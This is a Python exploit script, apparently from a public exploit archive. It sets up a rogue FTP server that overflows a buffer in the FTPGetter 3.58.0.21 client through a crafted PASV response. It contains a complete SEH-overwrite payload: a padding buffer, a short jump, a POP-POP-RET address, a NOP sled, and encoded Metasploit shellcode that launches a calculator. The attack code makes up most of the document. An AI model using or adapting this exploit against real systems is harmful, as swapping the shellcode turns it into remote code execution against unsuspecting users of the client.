#!/usr/bin/python

# Exploit Title: FTPGetter v3.58.0.21 Buffer Overflow (PASV) Exploit
# Date: 02/03/2011
# Author: modpr0be
# Software Link: http://www.ftpgetter.com/ftpgetter_setup.exe
# Vulnerable version: <= 3.58.0.21
# Tested on: Windows XP SP3 (VMware Player 3.1.3 build-324285)
# CVE : N/A

# ======================================================================
#        ___       _ __        __            __    _     __
#   ____/ (_)___ _(_) /_____ _/ / ___  _____/ /_  (_)___/ /___  ____ _
#  / __  / / __ `/ / __/ __ `/ / / _ \/ ___/ __ \/ / __  / __ \/ __ `/
# / /_/ / / /_/ / / /_/ /_/ / / /  __/ /__/ / / / / /_/ / / / / /_/ /
# \__,_/_/\__, /_/\__/\__,_/_/  \___/\___/_/ /_/_/\__,_/_/ /_/\__,_/
#        /____/                          http://www.digital-echidna.org
# ======================================================================
#
# Greetz:
#   say hello to all digital-echidna org crew:
#     otoy, cipherstring, bean, s3o, d00m, n0rf0x, fm, gotechidna, manix
#   special thx:
#     otoy, cipherstring, cyb3r.anbu, oebaj.
#   help for documentation:   	
#     offsec, exploit-db, corelan-team, 5M7X, loneferret.
#

#### Software description:
# Save time on FTP/SFTP updates! Plan your uploads and automate the workflow. 
# Schedule and automate file transfers with a centralized console. Let your 
# computer move or synchronize information securely between home and office 
# automatically according to the schedule!
#
#### Exploit information:
# There was an error when sending a response to the PASV command. 
# Fortunately, these errors lead to buffer overflows. 
# This exploit is unstable. It should only be used as a POC.
# I tried several times on various systems,  
# the buffer sometimes changed.
# 
### Some Conditions:
# This POC is using "the most selling feature" Automated FTP Request.
# So this POC, I use Auto Download with / as the Source Files.
# Scheduler Settings also set to Repetitive.
# Make sure to run the program first before this POC.
# 
#### Other information:
# It's a part of "Death of an FTP Client" :)
# For more information, loot at here:
# http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/
#
##

from socket import *
import struct
import time

total = 1000
junk1 = "\x41" * 485
nseh = "\xeb\x06\x90\x90"
seh = struct.pack('<L', 0x1001A149) # ppr from ssleay32.dll
nops = "\x90" * 8

# msfpayload windows/exec CMD=calc R | msfencode -t c 
# [*] x86/shikata_ga_nai succeeded with size 223 (iteration=1)
# BadChars \x00\xff\x0d\x5c\x2f\x0a

shellcode = (
"\xdb\xd1\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x32\xb8\xca\xea\xc0"
"\x1f\x31\x42\x17\x83\xc2\x04\x03\x88\xf9\x22\xea\xf0\x16\x2b"
"\x15\x08\xe7\x4c\x9f\xed\xd6\x5e\xfb\x66\x4a\x6f\x8f\x2a\x67"
"\x04\xdd\xde\xfc\x68\xca\xd1\xb5\xc7\x2c\xdc\x46\xe6\xf0\xb2"
"\x85\x68\x8d\xc8\xd9\x4a\xac\x03\x2c\x8a\xe9\x79\xdf\xde\xa2"
"\xf6\x72\xcf\xc7\x4a\x4f\xee\x07\xc1\xef\x88\x22\x15\x9b\x22"
"\x2c\x45\x34\x38\x66\x7d\x3e\x66\x57\x7c\x93\x74\xab\x37\x98"
"\x4f\x5f\xc6\x48\x9e\xa0\xf9\xb4\x4d\x9f\x36\x39\x8f\xe7\xf0"
"\xa2\xfa\x13\x03\x5e\xfd\xe7\x7e\x84\x88\xf5\xd8\x4f\x2a\xde"
"\xd9\x9c\xad\x95\xd5\x69\xb9\xf2\xf9\x6c\x6e\x89\x05\xe4\x91"
"\x5e\x8c\xbe\xb5\x7a\xd5\x65\xd7\xdb\xb3\xc8\xe8\x3c\x1b\xb4"
"\x4c\x36\x89\xa1\xf7\x15\xc7\x34\x75\x20\xae\x37\x85\x2b\x80"
"\x5f\xb4\xa0\x4f\x27\x49\x63\x34\xd7\x03\x2e\x1c\x70\xca\xba"
"\x1d\x1d\xed\x10\x61\x18\x6e\x91\x19\xdf\x6e\xd0\x1c\x9b\x28"
"\x08\x6c\xb4\xdc\x2e\xc3\xb5\xf4\x4c\x82\x25\x94\x92")

junk2 = "\x90" * (total - len(junk1+nseh+seh+nops+shellcode))
payload = junk1+nseh+seh+nops+shellcode+junk2

host = "0.0.0.0"
port = 21

s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)

print "\n[+] FTPGetter v3.58.0.21 Buffer Overflow POC"
print "[+] by modpr0be[at]digital-echidna[dot]org."
print "============================================="
print "[+] Evil FTP Server Started."
print "[+] Listening on %d ..." % port

cl, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]
print "[+] Whatever for username and password."

def hajar():
	welcome = "220 Welcome to EvilFTP Server\r\n"
	cl.send(welcome)
	cl.recv(1024)
	cl.send("331 User name okay, need password\r\n")	# received USER
	cl.recv(1024)
	cl.send("230-Password accepted\r\n")		# received PASS
	cl.send("230 User logged in.\r\n")
	cl.recv(1024)
	cl.send("215 UNIX Type: L8\r\n")   # received from SYST
	cl.recv(1024)
	cl.send("200 Type set to I\r\n")	# received from TYPE I
	cl.recv(1024)
	cl.send("200 OK\r\n")			# received from REST 0
	cl.recv(1024)
	cl.send("200 Command not Understood\r\n")	# received from OPTS UTF8 OFF
	cl.recv(1024)
	cl.send("257 \"/\" is current directory\r\n")	# received from PWD
	cl.recv(1024)
	cl.send("250 CWD Command successful.\r\n")
	cl.recv(1024)
	cl.send("257 \"/\" is current directory\r\n")	# received from PWD
	cl.recv(1024)
	cl.send("200 Type set to I\r\n")	# received from TYPE I
	cl.recv(1024)
	print "[+] Begin sending evil passive mode.."
	cl.send("227 Entering Passive Mode ("+payload+",1,1,1,1,1)\r\n")	# this is the junk from passive mode
	cl.recv(1024)
	cl.close() 

hajar()
time.sleep(3)
print "[+] Skadush! Calculator will pop out..\r\n" 

s.close()
